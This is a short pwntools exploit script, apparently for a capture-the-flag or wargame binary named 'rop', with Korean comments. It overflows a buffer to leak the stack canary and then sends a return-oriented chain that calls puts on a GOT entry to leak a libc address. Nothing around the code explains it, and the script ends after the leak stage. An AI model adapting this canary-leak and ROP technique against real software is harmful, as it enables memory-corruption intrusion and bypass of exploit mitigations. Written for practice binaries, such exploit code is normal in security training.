from pwn import *

def slog(name, addr):
        return success(": ".join([name, hex(addr)]))


p = process("./rop")
e = ELF("./rop")
r = ROP(e)



# [1] Leak Canary
def Leak_Canary():
    buf = b'A'*(0x40-7)
    p.sendafter("Buf: ", buf)
    p.recvuntil(buf)
    canary = u64(b'\x00'+p.recvn(7))
    slog("Canary", canary)

    return canary


# [2] Leak offset
def Leak_Offset(canary, func):
    leak_got = e.got[func]
    puts_plt = e.plt['puts']
    pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]

    payload = b'A'*56 + p64(canary) + b'B'*8

    # puts(leak@got)
    payload += p64(pop_rdi) + p64(leak_got) # puts(read@got)
    payload += p64(puts_plt)        # puts(read@got) 호출

    p.sendafter("Buf: ", payload)   # puts()와 read got를 이용해서 read() 주소 출력
    leak = u64(p.recvn(6)+b'\x00'*2)        # 화면에 출력된 read() 주소를 read에 대입
    
    return leak



canary = Leak_Canary()

log.info("Leak Offset")
func = input("Input function: ")
func = func[0:len(func)-1]
offset = Leak_Offset(canary, func)
slog(func, offset)

